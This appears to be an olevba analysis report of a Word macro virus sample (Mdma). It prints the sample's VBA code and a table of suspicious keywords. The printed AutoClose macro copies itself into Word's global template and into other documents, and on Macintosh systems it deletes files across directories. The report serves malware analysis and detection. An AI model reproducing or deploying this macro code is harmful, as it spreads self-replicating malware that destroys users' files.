olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Mdma.ax-812af9a4ee1ac0fdd03a1ef9c03b0c87cdab4cb3
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Mdma.ax-812af9a4ee1ac0fdd03a1ef9c03b0c87cdab4cb3 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: Virus.MSWord.Mdma.ax-812af9a4ee1ac0fdd03a1ef9c03b0c87cdab4cb3 - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "TemplateProject.AutoClose.MAIN"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoClose.MAIN"
    install
    infect
End Sub

Private Sub install()
Dim total
Dim installed
Dim i
Dim inspalled
    total = WordBasic.CountMacros(0)
    installed = 0
    If total > 0 Then
        For i = 1 To total
            If WordBasic.[MacroName$](i, 0) = "AutoClose" Then
                installed = 1
            End If
        Next
    End If
    If installed = 0 Then
        WordBasic.MacroCopy WordBasic.[WindowName$]() + ":AutoClose", "Global:AutoClose"
    Else
        total = WordBasic.CountMacros(1)
        installed = 0
        If total > 0 Then
            For i = 1 To total
                If WordBasic.[MacroName$](i, 1) = "AutoClose" Then
                    installed = 1
                End If
            Next
        End If
        If inspalled = 0 Then
            WordBasic.FileSaveAs Format:=1
            WordBasic.MacroCopy "Global:AutoClose", WordBasic.[WindowName$]() + ":AutoClose"
        End If
    End If
End Sub

Private Sub infect()
Dim count_
Dim i
    If (WordBasic.[GetSystemInfo$](21) = "Windows" Or WordBasic.[GetSystemInfo$](21) = "Windows NT") Then
        Open "c:\shmk." For Append As 1
        If LOF(1) <> 4 And WordBasic.Day(WordBasic.Now()) > 20 Then
            
        End If
        Close 1
    End If

    If Mid(WordBasic.[AppInfo$](21), 1, 3) = "Mac" And WordBasic.Day(WordBasic.Now()) > 4 Then
        WordBasic.ChDir "HD:"
        count_ = WordBasic.CountDirectories()
        For i = 1 To count_
            WordBasic.ChDir "HD" + WordBasic.[GetDirectory$](1)
            WordBasic.Kill WordBasic.[MacID$]("****")
            WordBasic.ChDir "HD:"
        Next
    End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO NewMacros 
in file: Virus.MSWord.Mdma.ax-812af9a4ee1ac0fdd03a1ef9c03b0c87cdab4cb3 - OLE stream: 'NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
